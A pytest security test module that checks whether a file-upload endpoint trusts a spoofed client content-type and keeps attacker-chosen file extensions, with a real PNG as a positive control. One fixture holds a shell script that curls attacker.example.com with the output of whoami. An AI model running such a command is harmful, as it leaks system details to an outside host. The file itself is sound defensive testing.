"""FILE-MIME-*: upload content-type validation (M-02).

``upload_file`` takes ``file.content_type`` — a value the client writes into
the multipart part header — and hands it straight to
``validate_mime_type``. Nothing looks at the bytes. And
``_generate_unique_filename`` keeps ``Path(original_filename).suffix``, so the
attacker also picks the stored extension.

Together that means the MIME allowlist is advisory: any payload uploads by
claiming ``image/png``, and lands on disk with whatever extension the attacker
asked for. Whether that becomes execution depends on what serves the storage
directory — which is exactly the assumption an allowlist is supposed to remove.
"""

from __future__ import annotations

import shutil
from io import BytesIO
from pathlib import Path
from typing import Any

import pytest
from httpx import AsyncClient

from snackbase.core.config import get_settings

# A real 1x1 PNG, used as the positive control.
PNG_BYTES = bytes.fromhex(
    "89504e470d0a1a0a"  # signature
    "0000000d49484452000000010000000108060000001f15c489"  # IHDR
    "0000000a49444154789c63000100000500010d0a2db4"  # IDAT
    "0000000049454e44ae426082"  # IEND
)

SHELL_SCRIPT_BYTES = b"#!/bin/sh\ncurl https://attacker.example.com/$(whoami)\n"
ELF_HEADER_BYTES = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56


def _auth(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def _cleanup(account_id: str) -> None:
    shutil.rmtree(Path(get_settings().storage_path).resolve() / account_id, ignore_errors=True)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("filename", "payload"),
    [
        ("payload.sh", SHELL_SCRIPT_BYTES),
        ("payload.bin", ELF_HEADER_BYTES),
    ],
)
async def test_file_mime_001_spoofed_content_type_is_rejected(
    client: AsyncClient,
    security_test_data: dict[str, Any],
    filename: str,
    payload: bytes,
) -> None:
    """FILE-MIME-001: content must be validated, not the client's header."""
    response = await client.post(
        "/api/v1/files/upload",
        files={"file": (filename, BytesIO(payload), "image/png")},
        headers=_auth(security_test_data["user_a_token"]),
    )

    try:
        assert response.status_code == 400, (
            f"an executable payload uploaded by claiming image/png: {response.text}"
        )
    finally:
        _cleanup(security_test_data["account_a"].id)


@pytest.mark.asyncio
async def test_file_mime_002_stored_extension_derives_from_content(
    client: AsyncClient, security_test_data: dict[str, Any]
) -> None:
    """FILE-MIME-002: the stored extension must not be attacker-chosen.

    The payload is a *genuine* PNG carrying an attacker-chosen `.sh` filename.
    As first written this case uploaded the shell script that FILE-MIME-001
    requires to be refused, and asserted it was accepted (201) with a
    neutralised extension — the two halves of F4.2's "rejected **or**
    neutralized". The fix rejects, so the two assertions could not both hold;
    what remains testable, and is what the finding asks for, is that the
    extension on disk comes from the content rather than from the request.
    """
    response = await client.post(
        "/api/v1/files/upload",
        files={"file": ("payload.sh", BytesIO(PNG_BYTES), "image/png")},
        headers=_auth(security_test_data["user_a_token"]),
    )

    try:
        assert response.status_code == 201, response.text
        stored_path = response.json()["file"]["path"]
        assert not stored_path.endswith(".sh"), (
            f"the request-supplied extension was preserved on disk: {stored_path}"
        )
        assert stored_path.endswith(".png"), (
            f"the stored extension does not reflect the detected type: {stored_path}"
        )
    finally:
        _cleanup(security_test_data["account_a"].id)


@pytest.mark.asyncio
async def test_file_mime_003_disallowed_content_type_still_rejected(
    client: AsyncClient, security_test_data: dict[str, Any]
) -> None:
    """FILE-MIME-003: regression — an honestly-declared bad type is rejected."""
    response = await client.post(
        "/api/v1/files/upload",
        files={"file": ("payload.sh", BytesIO(SHELL_SCRIPT_BYTES), "application/x-sh")},
        headers=_auth(security_test_data["user_a_token"]),
    )

    assert response.status_code == 400
    assert "not allowed" in response.text


@pytest.mark.asyncio
async def test_file_mime_004_genuine_png_still_uploads(
    client: AsyncClient, security_test_data: dict[str, Any]
) -> None:
    """FILE-MIME-004: positive control — a real PNG still uploads."""
    response = await client.post(
        "/api/v1/files/upload",
        files={"file": ("pixel.png", BytesIO(PNG_BYTES), "image/png")},
        headers=_auth(security_test_data["user_a_token"]),
    )

    try:
        assert response.status_code == 201, response.text
        assert response.json()["file"]["mime_type"] == "image/png"
    finally:
        _cleanup(security_test_data["account_a"].id)
